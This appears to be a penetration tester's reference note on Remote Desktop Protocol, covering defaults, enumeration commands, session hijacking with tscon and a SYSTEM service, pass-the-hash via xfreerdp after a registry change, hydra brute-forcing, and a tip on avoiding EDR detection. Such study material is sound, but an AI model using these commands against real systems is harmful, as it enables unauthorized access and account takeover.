```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```

## Summary
*Remote Desktop Protocol* (*RDP*) is a protocol for accessing a windows system remotely. It transmits display and control commands via a GUI over an encrypted TCP connection.

**Standard Port:** 
- 3389/tcp
- 3389/udp

| service name | releases link | notes |
| ------------ | ------------- | ----- |
|              |               |       |
## How it works
- Supports TLS/SSL but many windows systems don't insist it must be used. 
- By default the certificates are self-signed.
- It comes installed on windows by default. Activated using the *Server Manager*.
- Defaults to only allowing connections from hosts with [Network level authentication](https://en.wikipedia.org/wiki/Network_Level_Authentication) (*NLA*).

## Configuration


## Potential Capabilities
- Remote GUI access to a windows target
- RDP Session Hijacking

### RDP Session Hijacking
If we have a compromised `SYSTEM` account we can use this privilege to hijack another user's session with [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) (*this might let us gain access to a domain admin for example*).
```PowerShell
# Get all the users that have desktop sessions (shows us their session IDs)
PS C:\> query user

# Connect another user's session to our current one
PS C:\> tscon [TARGET_SESSION_ID] /dest:[OUR_SESSION_NAME]
```

We can use the [Microsoft sc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) to create a new service running as the `Local System` user to perform our goal:
```batch
C:\> sc.exe create [service_name] binpath= "[command_to_run]"
C:\> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

C:\> net start sessionhijack
```
> Also works in PS
> Patched: no longer works on Server 2019 :(

### PtH via RDP (Linux)
Under certain circumstances, PtH can be achieved via RDP to gain GUI access using a tool like [[xfreerdp]].
- `Restricted Admin Mode` must be enabled (*disabled by default*) on the target host.
	- The `DisableRestrictedAdmin` (*REG_DWORD*) key can be added to the `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value 0.
```batch
C:\> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Once enabled, we can use [[xfreerdp]] and the `/pth` option to gain access
```bash
$ xfreerdp /v:[target_ip] /u:[user] /pth:[hash]
```
User Account Control (UAC) can limit a local user's ability to perform remote administration operations. If the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0, only the built-in local admin can perform these operations. Setting it to 1 will allow other local admins.
> If the registry key `FilterAdministratorToken` is enabled (set to 1, but *disabled by default*) then even the RID 500 account is restricted. Meaning remote PTH will fail against even this account.

These settings only apply to local administrator accounts however, domain accounts with admin rights on the system can still be exploited using PtH.
## Enumeration Checklist

| Goal                | Command(s)                                                                    | Refs                                                                                                                                                               |
| ------------------- | ----------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| General Information | sudo nmap [ip] -sV -sC -p3389 --script rdp*                                   |                                                                                                                                                                    |
| RDP security check  | sudo cpan<br>rdp-sec-check.pl [ip]<br>                                        | [rdp-sec-check.pl](https://github.com/CiscoCXSecurity/rdp-sec-check)                                                                                               |
| RDP Bruteforce      | hydra -L [user_list] -P [pass_list] rdp://[ip]                                | [[Hydra]]<br>> this can cause account lockouts, so password-spraying attacks are preferred ([Crowbar](https://github.com/galkan/crowbar) can be used for this too) |
| Connect to an RDP   | xfreerdp /u:[user] /p:[pass] /v:[ip]<br><br>rdesktop -u [user] -p [pass] [ip] |                                                                                                                                                                    |
> Nmap uses the cookie `mstshash=nmap` on RDP connections. This can be identified by threat hunters or EDRs that could result in us getting blocked.
### Nmap Scripts
- rdp-*
- rdp-enum-encryption
- rdp-ntlm-info